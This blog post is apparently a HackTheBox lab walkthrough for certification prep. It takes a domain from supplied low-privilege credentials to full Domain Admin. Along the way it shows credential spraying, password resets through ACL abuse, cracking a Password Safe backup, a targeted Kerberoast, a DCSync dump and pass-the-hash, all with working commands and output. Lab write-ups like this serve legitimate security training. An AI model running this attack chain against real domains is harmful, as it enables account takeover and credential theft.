---
layout: post
title: "Administrator (Retired Box)"
date: 2025-11-10 10:00:00 +01:00
categories: ["HackTheBox", "Active Directory Labs", "Official CPTS Prep"]
tags: ["CPTS", "practice box", "active directory", "kerberoast", "bloodhound"]
image: /assets/img/posts/CPTS-prep/Admin/administrator.png
permalink: /administrator/
redirect_from:
  - /posts/Administrator/
draft: false
excerpt: "This walkthrough covers targeted Kerberoast, BloodHound paths, and AD privilege escalation."
---

## Overview
 `Administrator` is a medium Windows box built around a full domain-compromise chain. You’re given low-privileged credentials and must enumerate ACLs, SMB/WinRM, and AD data. BloodHound shows `olivia` has `GenericAll` on `michael`, so we reset Michael’s password, pivot, and use his `ForceChangePassword` right to take `benjamin`. Benjamin’s FTP contains `Backup.psafe3`, which we crack to recover plaintext credentials. Those creds score a valid `emily` login. `emily`’s `GenericWrite` on `ethan` enables a targeted Kerberoast. Cracking the service hash reveals `ethan`, who holds `DCSync` rights, allowing NTDS extraction and the final Administrator hash.

---
## Recon

I begin my scan by creating a dedicated directory for Nmap results. This keeps things organized and lets me easily return to previous scans later without confusion.

```bash
mkdir -p nmap/administrator
nmap -sC -sV -T4 -p- -vv -oA nmap/administrator 10.129.15.252
```

**Nmap Output:**

```shell
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-16 05:16:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-11-16T05:17:07
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_  Message signing enabled and required
|_clock-skew: 7h00m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.98 seconds
```

**Kerberos (88)**, **DNS (53)**, and **LDAP (389/3268)** suggest that this is a **Domain Controller**. The domain name `administrator.htb` is also revealed from the LDAP banner.

I add it to my `/etc/hosts` for smooth hostname resolution later:

```bash
echo "10.129.15.252 administrator.htb" | sudo tee -a /etc/hosts
```

___

## Initial priorities

We already have credentials given to us at the onset: Username: `olivia`, Password: `ichliebedich`.  Our next logical path of attack is to:

- **WinRM** — inspect `Desktop`, `Documents`, `AppData` and common backup locations for secrets.
    
- **SMB shares** — enumerate shares, permissions and accessible file servers for backups or credential dumps.
    
- **FTP** — check anonymous or authenticated FTP access for uploaded backups or user data.
    
- **BloodHound / LDAP ingest** — collect AD relationships (ACLs, group membership, delegated rights).
    
- **AD CS / Certificate Services (ADCS)** — look for misissued certificates or automatic enrollments that can be abused for lateral movement.

These steps usually reveal either high-value artifacts (password stores, config blobs, PFX files) or delegated permissions that can let me pivot without noisy, risky exploits.

---
I quickly test the supplied creds against the open services using `netexec`:

```shell
nxc ftp administrator.htb -u Olivia -p ichliebedich       # No luck 
nxc smb administrator.htb -u Olivia -p ichliebedich       # Works! 
nxc winrm administrator.htb -u Olivia -p ichliebedich     # Works too!
```

---
Then I get an interactive WinRM shell:

`evil-winrm -i administrator.htb -u olivia -p ichliebedich`

```powershell
Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\olivia\Documents> ls C:\Users\

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         11/7/2025   2:21 PM                olivia
d-r---         10/4/2024  10:08 AM                Public 
```

I see an `emily` profile but it’s not accessible from `olivia`:

```powershell
*Evil-WinRM* PS C:\Users\olivia\Documents> ls C:\Users\emily\
Access to the path 'C:\Users\emily' is denied.
```

### Check privileges of the current user

Next I run `whoami /all` to enumerate groups and privileges:

```powershell
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /all

USER INFORMATION
----------------
User Name:      administrator\olivia
SID:            S-1-5-21-1088858960-373806567-254189436-1108

GROUP INFORMATION
-----------------
Everyone
BUILTIN\Remote Management Users
BUILTIN\Users
BUILTIN\Pre-Windows 2000 Compatible Access
NT AUTHORITY\NETWORK
NT AUTHORITY\Authenticated Users
NT AUTHORITY\This Organization
NT AUTHORITY\NTLM Authentication
Mandatory Label\Medium Plus

PRIVILEGES INFORMATION
----------------------
SeMachineAccountPrivilege     Add workstations to domain      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set  Enabled
```

>**Interpretation:** `olivia` is a normal domain user with standard privileges. That said, common AD misconfigurations (delegation/ACLs, writable attributes, backup files) are likely to be present and can be abused. To confirm this, I move to ingest AD data with `BloodHound` and enumerate ACLs.
{: .prompt-info }

---

## BloodHound data & delegation discovery

I ingested LDAP/AD data into `BloodHound` with the following command:

```shell
bloodhound-python -u Olivia -p ichliebedich -c All -d administrator.htb -ns 10.129.15.252
```
>**What this does:** `bloodhound-python` collects LDAP, ACL, session and group data and uploads it to a BloodHound database so you can visualise relationships and find short escalation paths.

>**Tip:** If you prefer a Rust-based collector, [`RustHound-CE`](https://github.com/g0h4n/RustHound-CE) (by g0h4n) is a great alternative. It’s written in Rust and often captures additional artifacts compared to the Python collector. Use whichever collector you trust and are comfortable with; the important part is ingesting complete ACL and session data so BloodHound can highlight delegation paths you can abuse.
{: .prompt-tip }

After starting Neo4j and opening the `BloodHound` UI, the graph showed a **direct delegation** via outbound control between `olivia` and a `michael` user:

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/02.png' | relative_url }})

>**This is critical**: `GenericAll` on a user object grants essentially full control over that account, including the ability to reset its password. In practical terms, Olivia can take over Michael immediately.
{: .prompt-warning }

There are multiple ways to reset a delegated account's password:

### Option A — run `net user` from the `evil-winrm` shell I already have as Olivia:

```powershell
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael password123. /domain
The command completed successfully.
```

### Option B — use `bloodyAD`

```bash
bloodyAD -u "olivia" -p "ichliebedich" -d "administrator.htb" --host "10.129.15.252" set password "Michael" "Password123."
```

### Option C —use `net rpc` to perform the reset from an attacker host (no victim shell):

```bash
net rpc password "michael" "password123." -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.15.252
```

> **Why act now**: changing Michael’s password is the shortest path to a new foothold. Once I can pivot to Michael, I can re-run enumeration, and look for further delegation.
{: .prompt-info }

---

## Pivoting to Michael

After changing Michael's password, I can now login using `evil-winrm` on another tab:

```bash
evil-winrm -i administrator.htb -u michael -p "password123."
```

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/03.png' | relative_url }})

---
## Pivot: Michael → Benjamin (ForceChangePassword)

`BloodHound` showed a delegation: **Michael → Benjamin : `ForceChangePassword`**. Using `Michael`’s account I can successfully reset `Benjamin`’s password.

From `Michael`’s `Evil-WinRM` shell:

```powershell
*Evil-WinRM* PS C:\Users\michael\Documents> net user benjamin password123. /domain The command completed successfully.
```

Or from the attacker host:

```bash
net rpc password "benjamin" "password123." -U "administrator.htb"/"michael"%"password123." -S 10.129.15.252
```

Once done, I attempt to connect to Benjamin via `WinRM` but that does not work, so I use `netexec` to quickly test other services:

```shell
nxc winrm administrator.htb -u benjamin -p password123.   # No luck
nxc ftp administrator.htb -u benjamin -p password123.     # Works!
nxc smb administrator.htb -u benjamin -p password123.     # Works too!
```

From the `BloodHound` analysis, I noticed **Benjamin** is a member of the **Share Moderates** group, which explains the accessible SMB/FTP resources.

---
## Retrieving and cracking Benjamin’s backup

Since ftp is accessible, I logged in and was able to find and retrieve a Password Safe backup file: `Backup.psafe3`. I cracked it with Hashcat:

`hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt`

> **Note:** Hashcat mode **5200** is for Password Safe v3 (`*.psafe3`)
{: .prompt-info }

```shell
Bytes.....: 139921507
Keyspace..: 14344385
Runtime...: 1 sec

Backup.psafe3:tekieromucho

Session...........: hashcat
Status............: Cracked
Hash.Mode.........: 5200 (Password Safe v3)
Hash.Target.......: Backup.psafe3
Time.Started......: Fri Nov  7 17:36:32 2025 (0 secs)
Time.Estimated....: Fri Nov  7 17:36:32 2025 (0 secs)
Kernel.Feature....: Pure Kernel
Guess.Base........: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue.......: 1/1 (100.00%)
Speed.#2..........: 45436 H/s (3.61ms) @ Accel:128 Loops:1024
Recovered.........: 1/1 (100.00%) Digests (total), 1/1 (100.00%)
Progress..........: 5120/14344385 (0.04%)
Rejected..........: 0/5120 (0.00%)
Restore.Point.....: 4608/14344385 (0.03%)
Restore.Sub.#2....: Salt:0 Amplifier:0.1 Iteration:2048-2048
```

---

## Install Password Safe locally (to inspect backups)

Once I cracked the `Backup.psafe3` password, I installed the official Password Safe client locally so I can open and inspect the backup file.

```bash
curl -L -o passwordsafe.deb https://github.com/pwsafe/pwsafe/releases/download/1.22.0/passwordsafe-debian12-1.22-amd64.deb
sudo apt-get install -f -y
sudo dpkg -i passwordsafe.deb
```

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/04.png' | relative_url }})
#### Plaintext credentials recovered

```
Alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

With these credentials I mapped each discovered username and tested them against services to find the easiest access path. `emily` authenticated successfully over SMB and WinRM, so I pivoted to her account via `evil-WinRM`:

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/05.png' | relative_url }})

## Performing Targeted Kerberoast via GenericWrite

Based on BloodHound, the shortest path to Domain Admin runs through `ethan` and the graph shows **emily → ethan : `GenericWrite`**. That permission is powerful because it lets us modify attributes on Ethan’s user object (notably the `servicePrincipalName` / `servicePrincipalName` attribute), which enables a [targeted Kerberoast](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/).

The plan:
1. **Add a fake SPN** — use `Emily`’s `GenericWrite` to assign a fabricated SPN to Ethan’s account.
    
2. **Request a service ticket (TGS)** — We will then request a Kerberos service ticket (TGS) for this fake service from the Domain Controller.
    
3. **Kerberoast** — We will export this encrypted ticket and perform an offline brute-force attack to recover ethan's password.
    
4. **Offline crack** — export the encrypted ticket and brute-force it offline to recover Ethan’s password.

The success of this Kerberoasting attack hinges on the strength of `ethan`'s password. If it is weak, we will obtain his credentials. Given that `ethan` is a stepping stone to Domain Admin, compromising his account could lead to the discovery of DCSync rights or other privileged access, resulting in a full domain compromise.

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/06.png' | relative_url }})

I used the `targetedKerberoast` tool to perform the targeted Kerberoast from `emily` against the domain controller:

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
python3 targetedKerberoast.py -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.129.15.252
```

On the first run I hit the classic Kerberos error:

`KRB_AP_ERR_SKEW (Clock skew too great)`

This means the client and the Domain Controller clocks are out of sync, so Kerberos rejects the request. I corrected it locally by syncing time with the DC:

```shell
sudo ntpdate administrator.htb
```

After syncing time I re-ran the targeted Kerberoast:

```shell
cd targetedKerberoast python3 targetedKerberoast.py -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.129.15.252
```

The tool completed successfully and wrote the captured service ticket/hash to a `ethan.txt`.
I then cracked that hash offline:

```shell
# with
johnjohn --wordlist=/usr/share/wordlists/rockyou.txt ethan.txt

# or with hashcat
hashcat ethan.txt /usr/share/wordlists/rockyou.txt
```

The captured hash reveal Ethan’s password: **`limpbizkit`**.

___
Next, I validated Ethan’s creds against `SMB` and `WinRM`:

```shell
nxc smb administrator.htb -u Ethan -p limpbizkit       # Works! 
nxc winrm administrator.htb -u Ethan -p limpbizkit     # No luck
```

I don’t need an interactive shell at this point. `SMB` access is enough to confirm the account and `BloodHound` already showed Ethan has **DCSync** privileges.

>**Why this matters:** DCSync allows an account to request replication data from the Domain Controller (including NTDS hashes). With DCSync I can extract password hashes for any domain account, including Domain Admin. This effectively gives me full domain compromise.
{: .prompt-info }

```shell
secretsdump.py ethan:limpbizkit@dc.administrator.htb
```

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/07.png' | relative_url }})

---
## Root

With the NTLM hash of the domain admin in hand, I Pass-The-Hash using `-H` with Evil-WinRM:

```shell
evilwinrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

![Title card]({{ 'assets/img/posts/CPTS-prep/Admin/08.png' | relative_url }})

And that’s it, `Domain Admin` is compromised!
